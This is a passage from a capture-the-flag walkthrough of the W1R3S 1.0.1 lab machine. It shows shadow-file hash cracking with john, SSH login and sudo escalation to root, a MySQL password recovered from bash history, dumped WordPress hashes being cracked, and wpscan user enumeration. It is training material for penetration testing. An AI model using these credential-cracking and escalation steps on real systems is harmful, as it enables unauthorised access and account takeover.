+  <div>rtkit:*:17379:0:99999:7:::</div>
+  <div>saned:*:17379:0:99999:7:::</div>
+  <div>usbmux:*:17379:0:99999:7:::</div>
+  <div>w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::</div>
+  <div>sshd:*:17554:0:99999:7:::</div>
+  <div>ftp:*:17554:0:99999:7:::</div>
+  <div>mysql:!:17554:0:99999:7:::</div>
+  <div>[...snip...]</div>
+</div>
+<div><br /></div>
+<div>Let's run john's unshadow on the two files and see if we can crack any of the accounts.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+  <div>root@kali:~/Walkthroughs/w1r3s# unshadow ./passwd ./shadow &gt; crackme</div>
+  <div>root@kali:~/Walkthroughs/w1r3s# john crackme</div>
+  <div>[...snip...]</div>
+  <div>www-data         (www-data)</div>
+  <div>
+    <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">computer         (w1r3s)</font>
+  </div>
+  <div>[...snip...]</div>
+</div>
+<div><br /></div>
+<div>We were able to crack the w1r3s user account. Let's see if we can SSH into the server with this account.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+  <div>root@kali:~/Walkthroughs/w1r3s# ssh w1r3s@10.183.0.197</div>
+  <div>----------------------</div>
+  <div>Think this is the way?</div>
+  <div>----------------------</div>
+  <div>Well,........possibly.</div>
+  <div>----------------------</div>
+  <div>w1r3s@10.183.0.197's password: </div>
+  <div>Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.13.0-36-generic x86_64)</div>
+  <div>
+    <div><br /></div>
+  </div>
+  <div> * Documentation:  https://help.ubuntu.com</div>
+  <div> * Management:     https://landscape.canonical.com</div>
+  <div> * Support:        https://ubuntu.com/advantage</div>
+  <div>
+    <div><br /></div>
+  </div>
+  <div>237 packages can be updated.</div>
+  <div>11 updates are security updates.</div>
+  <div>
+    <div><br /></div>
+  </div>
+  <div>New release '18.04.2 LTS' available.</div>
+  <div>Run 'do-release-upgrade' to upgrade to it.</div>
+  <div>
+    <div><br /></div>
+  </div>
+  <div>*** System restart required ***</div>
+  <div>.....You made it huh?....</div>
+  <div>Last login: Thu May 23 13:34:52 2019 from 10.183.0.222</div>
+  <div>w1r3s@W1R3S:~$ id</div>
+  <div>uid=1000(w1r3s) gid=1000(w1r3s) groups=1000(w1r3s),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)</div>
+</div>
+<div><br /></div>
+<div>We are in! 😄</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+  <h2>Maintaining Access</h2>
+</div>
+<div><br /></div>
+<div>Skipping this step since we have direct SSH access. In a "live" scenario, we'd still need to ensure a way back in just in case SSH gets locked down.</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+  <h2>Privilege Escalation</h2>
+</div>
+<div><br /></div>
+<div>We noticed that sudo was listed in our groups (in the id command above), so the first thing we try is 'sudo -l'.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+  <div>w1r3s@W1R3S:~$ sudo -l</div>
+  <div>[sudo] password for w1r3s: </div>
+  <div>Matching Defaults entries for w1r3s on W1R3S.homenet.dom:</div>
+  <div>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</div>
+  <div>
+    <div><br /></div>
+  </div>
+  <div>User w1r3s may run the following commands on W1R3S.homenet.dom:</div>
+  <div>    (ALL : ALL) ALL</div>
+</div>
+<div><br /></div>
+<div>ALL! REALLY! Wow! Well, I guess we have "root"...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+  <div>w1r3s@W1R3S:~$ sudo bash</div>
+  <div>root@W1R3S:~# id</div>
+  <div>uid=0(root) gid=0(root) groups=0(root)</div>
+</div>
+<div><br /></div>
+<div>All that's left to do now is get the flag.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+  <div>root@W1R3S:~# cd /root</div>
+  <div>root@W1R3S:/root# cat flag.txt</div>
+  <div>-----------------------------------------------------------------------------------------</div>
+  <div>   ____ ___  _   _  ____ ____      _  _____ _   _ _        _  _____ ___ ___  _   _ ____  </div>
+  <div>  / ___/ _ \| \ | |/ ___|  _ \    / \|_   _| | | | |      / \|_   _|_ _/ _ \| \ | / ___| </div>
+  <div> | |  | | | |  \| | |  _| |_) |  / _ \ | | | | | | |     / _ \ | |  | | | | |  \| \___ \ </div>
+  <div> | |__| |_| | |\  | |_| |  _ &lt;  / ___ \| | | |_| | |___ / ___ \| |  | | |_| | |\  |___) |</div>
+  <div>  \____\___/|_| \_|\____|_| \_\/_/   \_\_|  \___/|_____/_/   \_\_| |___\___/|_| \_|____/ </div>
+  <div>                                                                                        </div>
+  <div>-----------------------------------------------------------------------------------------</div>
+  <div>
+    <div><br /></div>
+  </div>
+  <div>                          .-----------------TTTT_-----_______</div>
+  <div>                        /''''''''''(______O] ----------____  \______/]_</div>
+  <div>     __...---'"""\_ --''   Q                               ___________@</div>
+  <div> |'''                   ._   _______________=---------"""""""</div>
+  <div> |                ..--''|   l L |_l   |</div>
+  <div> |          ..--''      .  /-___j '   '</div>
+  <div> |    ..--''           /  ,       '   '</div>
+  <div> |--''                /           `    \</div>
+  <div>                      L__'         \    -</div>
+  <div>                                    -    '-.</div>
+  <div>                                     '.    /</div>
+  <div>                                       '-./</div>
+  <div>
+    <div><br /></div>
+  </div>
+  <div>----------------------------------------------------------------------------------------</div>
+  <div>  YOU HAVE COMPLETED THE</div>
+  <div>               __      __  ______________________   _________</div>
+  <div>              /  \    /  \/_   \______   \_____  \ /   _____/</div>
+  <div>              \   \/\/   / |   ||       _/ _(__  &lt; \_____  \ </div>
+  <div>               \        /  |   ||    |   \/       \/        \</div>
+  <div>                \__/\  /   |___||____|_  /______  /_______  /.INC</div>
+  <div>                     \/                \/       \/        \/        CHALLENGE, V 1.0</div>
+  <div>----------------------------------------------------------------------------------------</div>
+  <div>
+    <div><br /></div>
+  </div>
+  <div>CREATED BY SpecterWires</div>
+  <div>
+    <div><br /></div>
+  </div>
+  <div>----------------------------------------------------------------------------------------</div>
+</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+  <h2>Pivoting</h2>
+</div>
+<div>N/A</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+  <h2>Clean Up</h2>
+</div>
+<div>N/A</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+  <h2>Additional Info</h2>
+</div>
+<div><br /></div>
+<div><span style="font-weight: bold;">.bash_history</span></div>
+<div><br /></div>
+<div>Digging through the .bash_history file in /root, we were able to find the mysql password for the 'root' user.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+  <div>mysql -u root -p Iamroot!</div>
+</div>
+<div><br /></div>
+<div>Let's see what we can find in the database.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+  <div>root@W1R3S:/root# mysql -u root -p</div>
+  <div>Enter password: </div>
+  <div>Welcome to the MySQL monitor.  Commands end with ; or \g.</div>
+  <div>Your MySQL connection id is 157135</div>
+  <div>Server version: 5.7.26-0ubuntu0.16.04.1 (Ubuntu)</div>
+  <div>
+    <div><br /></div>
+  </div>
+  <div>Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.</div>
+  <div>
+    <div><br /></div>
+  </div>
+  <div>Oracle is a registered trademark of Oracle Corporation and/or its</div>
+  <div>affiliates. Other names may be trademarks of their respective</div>
+  <div>owners.</div>
+  <div>
+    <div><br /></div>
+  </div>
+  <div>Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.</div>
+  <div>
+    <div><br /></div>
+  </div>
+  <div>mysql&gt; show databases;</div>
+  <div>+--------------------+</div>
+  <div>| Database           |</div>
+  <div>+--------------------+</div>
+  <div>| information_schema |</div>
+  <div>| Cuppa              |</div>
+  <div>| cuppa              |</div>
+  <div>| cuppacms           |</div>
+  <div>| mysql              |</div>
+  <div>| performance_schema |</div>
+  <div>| sys                |</div>
+  <div>| wordpress          |</div>
+  <div>+--------------------+</div>
+  <div>8 rows in set (0.16 sec)</div>
+  <div><br /></div>
+  <div>[...snip...]</div>
+  <div><br /></div>
+  <div>mysql&gt; select ID,user_login,user_pass from wp_users;</div>
+  <div>+----+------------+------------------------------------+</div>
+  <div>| ID | user_login | user_pass                          |</div>
+  <div>+----+------------+------------------------------------+</div>
+  <div>|  1 | Admin      | $P$BwcIGXVnzH.PDrNs1uu4z7mYmq.hcV0 |</div>
+  <div>|  2 | Joseph.G   | $P$BDQUOdjokgLpC2OGE8DkEeVXJQQU/p1 |</div>
+  <div>+----+------------+------------------------------------+</div>
+  <div>2 rows in set (0.00 sec)</div>
+</div>
+<div><br /></div>
+<div>Using john, we were able to crack the Joseph.G account password.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+  <div>travelers        (Joseph.G)</div>
+</div>
+<div><br /></div>
+<div>For future reference, the following wordlists contained this password (if I would have only used them!)</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+  <div>root@kali:/usr/share/seclists/Passwords# grep -ri 'travelers' * | cut -d ':' -f 1 | sort -u | xargs ls -lSh</div>
+  <div>-rw-r--r-- 1 root root  52M May  8 06:22 xato-net-10-million-passwords.txt</div>
+  <div>-rw-r--r-- 1 root root  40M May  8 06:22 openwall.net-all.txt</div>
+  <div>-rw-r--r-- 1 root root  32M May  8 06:22 Leaked-Databases/alleged-gmail-passwords.txt</div>
+  <div>-rw-r--r-- 1 root root  31M May  8 06:22 Leaked-Databases/md5decryptor.uk.txt</div>
+  <div>-rw-r--r-- 1 root root  15M May  8 06:22 bt4-password.txt</div>
+  <div>-rw-r--r-- 1 root root  15M May  8 06:22 darkc0de.txt</div>
+  <div>-rw-r--r-- 1 root root 9.2M May  8 06:22 xato-net-10-million-passwords-1000000.txt</div>
+  <div>-rw-r--r-- 1 root root 8.2M May  8 06:22 Common-Credentials/10-million-password-list-top-1000000.txt</div>
+  <div>-rw-r--r-- 1 root root 6.7M May  8 06:22 xato-net-10-million-passwords-dup.txt</div>
+  <div>-rw-r--r-- 1 root root 3.9M May  8 06:22 Leaked-Databases/honeynet-withcount.txt</div>
+  <div>-rw-r--r-- 1 root root 3.5M May  8 06:22 Leaked-Databases/Ashley-Madison.txt</div>
+  <div>-rw-r--r-- 1 root root 2.8M May  8 06:22 Leaked-Databases/honeynet2.txt</div>
+  <div>-rw-r--r-- 1 root root 2.0M May  8 06:22 Leaked-Databases/honeynet.txt</div>
+</div>
+<div><br /></div>
+<div>Logging into the WordPress site with Joseph's credentials, we see that he is an admin.</div>
+<div><br /></div>
+<div><img height="335" src="/assets/images/2019-05-23-w1r3s-1.0.1/3B919CA8-B685-47F3-B973-20EE3E4B3BB9.png" width="1179" /></div>
+<div><br /></div>
+<div>If we didn't already have root, we could probably get a reverse shell by uploading a malicious plugin or dropping our PHP code in a template page.</div>
+<div><br /></div>
+<div><br /></div>
+<div><b>Cuppa CMS</b></div>
+<div><br /></div>
+<div>I'm guessing the Cuppa CMS site was only available to provide us a LFI vulnerability. However, I went ahead and messed with the installation. Clicking Next after the initial installation page takes us to a database setup page.</div>
+<div><br /></div>
+<div><img height="580" src="/assets/images/2019-05-23-w1r3s-1.0.1/ACB76117-B2CC-4A03-8128-2397E868FF2B.png" width="566" /><br /></div>
+<div><br /></div>
+<div>Before I had valid database credentials, I tried to get the site up and working by having it create its database on my attacking machine.</div>
+<div><br /></div>
+<div><img height="579" src="/assets/images/2019-05-23-w1r3s-1.0.1/70F6DBB6-C534-43BD-8BBE-39A1F74862AC.png" width="575" /></div>
+<div><br /></div>
+<div>This allowed it to complete the database setup successfully, but permissions on the installation directory prevented it from being removed...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+  <div>root@W1R3S:/var/www/html/administrator# ls -l</div>
+  <div>[...snip...]</div>
+  <div>
+    <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">drwxr-xr-x</font>  3 root root 4096 Dec 16  2017 installation
+  </div>
+  <div>[...snip...]</div>
+</div>
+<div><br /></div>
+<div>...so the setup could not complete.</div>
+<div><br /></div>
+<div><br /></div>
+<div><b>WordPress</b></div>
+<div><br /></div>
+<div>Trying to connect to /wordpress redirects us to <a href="http://localhost/wordpress/" target="_blank">http://localhost/wordpress/</a>, which fails (of course). Going directly to <a href="http://10.183.0.197/wordpress/index.php">http://10.183.0.197/wordpress/index.php</a> works, but lots of content fails to load (due to the localhost issue). We'll set up Burp Suite to proxy our traffic and change any references to localhost or 127.0.0.1 in the response body/header to our victim's IP (10.183.0.197).</div>
+<div><br /></div>
+<div><img height="223" src="/assets/images/2019-05-23-w1r3s-1.0.1/D75839ED-56B4-4C52-9705-6C52213FCCF4.png" width="1065" /><br /></div>
+<div><br /></div>
+<div>Using wpscan (running through the proxy) we are able to enumerate some of the site users.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+  <div>root@kali:~/Walkthroughs/w1r3s# wpscan --url "http://10.183.0.197/wordpress" --proxy http://127.0.0.1:8080 --wp-content-dir "http://10.183.0</div>
+  <div>&gt; .197/wordpress/wp-content" -e u1-50</div>
+  <div>_______________________________________________________________</div>
+  <div>        __          _______   _____</div>
+  <div>        \ \        / /  __ \ / ____|</div>
+  <div>         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</div>
+  <div>          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \</div>
+  <div>           \  /\  /  | |     ____) | (__| (_| | | | |</div>
+  <div>            \/  \/   |_|    |_____/ \___|\__,_|_| |_|</div>
+  <div>
+    <div><br /></div>
+    <div><br /></div>
+  </div>
+  <div>        WordPress Security Scanner by the WPScan Team</div>
+  <div>                       Version 3.5.3</div>
+  <div>          Sponsored by Sucuri - https://sucuri.net</div>
+  <div>      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_</div>
+  <div>_______________________________________________________________</div>
+  <div>
+    <div><br /></div>
+  </div>
+  <div>[+] URL: http://10.183.0.197/wordpress/</div>
+  <div>[+] Started: Thu May 23 17:22:01 2019</div>
+  <div>
+    <div><br /></div>
+  </div>
+  <div>Interesting Finding(s):</div>
+  <div>
+    <div><br /></div>
+  </div>
+  <div>[+] http://10.183.0.197/wordpress/</div>
+  <div> | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)</div>
+  <div> | Found By: Headers (Passive Detection)</div>
+  <div> | Confidence: 100%</div>
+  <div>
+    <div><br /></div>
+  </div>
+  <div>[+] http://10.183.0.197/wordpress/xmlrpc.php</div>
+  <div> | Found By: Direct Access (Aggressive Detection)</div>
+  <div> | Confidence: 100%</div>
+  <div> | References:</div>
+  <div> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</div>
+  <div> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner</div>
+  <div> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos</div>
+  <div> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login</div>
+  <div> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access</div>
+  <div>
+    <div><br /></div>
+  </div>
+  <div>[+] http://10.183.0.197/wordpress/readme.html</div>
+  <div> | Found By: Direct Access (Aggressive Detection)</div>
+  <div> | Confidence: 100%</div>
+  <div>
+    <div><br /></div>
+  </div>
+  <div>[+] http://10.183.0%0A.197/wordpress/wp-content/backup-db/</div>
+  <div> | Found By: Direct Access (Aggressive Detection)</div>
+  <div> | Confidence: 70%</div>
+  <div> | Reference: https://github.com/wpscanteam/wpscan/issues/422</div>
+  <div>
+    <div><br /></div>
+  </div>
+  <div>[+] This site has 'Must Use Plugins': http://10.183.0%0A.197/wordpress/wp-content/mu-plugins/</div>
+  <div> | Found By: Direct Access (Aggressive Detection)</div>
+  <div> | Confidence: 80%</div>
+  <div> | Reference: http://codex.wordpress.org/Must_Use_Plugins</div>
+  <div>
+    <div><br /></div>
+  </div>
+  <div>[+] http://10.183.0.197/wordpress/wp-cron.php</div>
+  <div> | Found By: Direct Access (Aggressive Detection)</div>
+  <div> | Confidence: 60%</div>
+  <div> | References:</div>
+  <div> |  - https://www.iplocation.net/defend-wordpress-from-ddos</div>
+  <div> |  - https://github.com/wpscanteam/wpscan/issues/1299</div>
+  <div>
+    <div><br /></div>
+  </div>
+  <div>[+] WordPress version 4.9.10 identified (Latest, released on 2019-03-13).</div>
+  <div> | Detected By: Atom Generator (Aggressive Detection)</div>
+  <div> |  - http://10.183.0.197/wordpress/index.php/feed/atom/, &lt;generator uri="https://wordpress.org/" version="4.9.10"&gt;WordPress&lt;/generator&gt;</div>
+  <div> | Confirmed By: Opml Generator (Aggressive Detection)</div>
+  <div> |  - http://10.183.0.197/wordpress/wp-links-opml.php, Match: 'generator="WordPress/4.9.10"'</div>
+  <div>
+    <div><br /></div>
+  </div>
+  <div>[i] The main theme could not be detected.</div>
+  <div>
+    <div><br /></div>
+  </div>
+  <div>[+] Enumerating Users (via Passive and Aggressive Methods)</div>
+  <div> Brute Forcing Author IDs - Time: 00:00:01 &lt;========================================================================&gt; (50 / 50) 100.00% Time: 00:00:01</div>
+  <div>
+    <div><br /></div>
+  </div>
+  <div>[i] User(s) Identified:</div>
+  <div>
+    <div><br /></div>
+  </div>
+  <div>[+] joseph-g</div>
+  <div> | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</div>
+  <div>
+    <div><br /></div>
+  </div>
+  <div>[+] admin</div>
+  <div> | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</div>
+  <div> | Confirmed By: Login Error Messages (Aggressive Detection)</div>
+  <div>
+    <div><br /></div>
+    <div>[...snip...]</div>
+  </div>
+</div>
+<div><br /></div>
+<div>Confirming these usernames by logging into <a href="http://10.183.0.197/wordpress/wp-login.php">http://10.183.0.197/wordpress/wp-login.php</a>, we are only able to identify 'admin' as a valid username.</div>
+<div><br /></div>
+<div><img height="91" src="/assets/images/2019-05-23-w1r3s-1.0.1/55BD6CB6-58FA-49CA-8B63-DE456DE96CF0.png" width="336" /></div>
+<div><br /></div>
+<div class="note"><b>NOTE:</b> I also tried several of the other employee names (as identified in the employee-names.txt), but none came back as valid.</div>
+<div><br /></div>
+<div class="note"><b>NOTE:</b> Turns out the username for joseph is actually joseph.g.
+<br /><br />
+<img height="91" src="/assets/images/2019-05-23-w1r3s-1.0.1/7BFBF77F-B681-4E86-BF4F-C821665E331D.png" width="335" /></div>
+<div><br /></div>
+<div><br /></div>
